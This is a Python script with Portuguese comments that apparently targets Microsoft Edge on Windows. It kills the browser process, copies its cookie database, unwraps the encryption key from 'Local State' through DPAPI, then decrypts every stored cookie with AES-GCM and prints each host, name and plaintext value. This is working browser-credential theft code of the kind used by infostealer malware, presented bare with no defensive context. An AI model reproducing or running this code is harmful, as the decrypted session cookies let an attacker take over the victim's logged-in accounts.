import os
import sqlite3
import json
import base64
from shutil import copyfile
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import win32crypt

def getCookies():
    try:
        os.system("taskkill /F /IM msedge.exe")
        os.system('cls' if os.name == 'nt' else 'clear')

        # Caminhos para os arquivos do Edge
        db_path = os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies"
        local_state_path = os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Local State"
        temp_db_path = os.path.join(os.getenv("TEMP"), "Cookies_temp") 

        # Copiar banco temporariamente para evitar bloqueios
        copyfile(db_path, temp_db_path)

        # Carregar chave de criptografia do arquivo "Local State"
        with open(local_state_path, 'r', encoding='utf-8') as file:
            local_state = json.load(file)

        # Extrai e descriptografa a chave do Local State
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]  # Remove o prefixo 'DPAPI'
        decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

        # Conectar ao banco de dados SQLite
        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")

        # Processar cookies criptografados
        for host, name, encrypted_value in cursor.fetchall():
            try:
                # Verifica prefixos (v10, v11, v20)
                if encrypted_value[:3] in [b'v10', b'v11', b'v20']:
                    iv = encrypted_value[3:15]  # Pega os 12 bytes do IV
                    encrypted_data = encrypted_value[15:-16]  # Dados criptografados
                    tag = encrypted_value[-16:]  # Tag de autenticação GCM

                    # Configurar decifrador AES-GCM com a chave e IV
                    cipher = Cipher(
                        algorithms.AES(decrypted_key),
                        modes.GCM(iv, tag),
                        backend=default_backend()
                    )
                    decryptor = cipher.decryptor()
                    decrypted_value = decryptor.update(encrypted_data) + decryptor.finalize()
                    decrypted_value = decrypted_value.decode('utf-8')

                else:
                    decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()

                # Exibir os cookies descriptografados
                print(f"Host: {host}")
                print(f"Cookie Name: {name}")
                print(f"Cookie Value: {decrypted_value}\n")
                
            except Exception as e:
                print(f"Failed to decrypt cookie {name} for {host}: {e}")

        conn.close()
        os.remove(temp_db_path)  # Remove o arquivo temporário

    except Exception as e:
        print(f"Error: {e}")

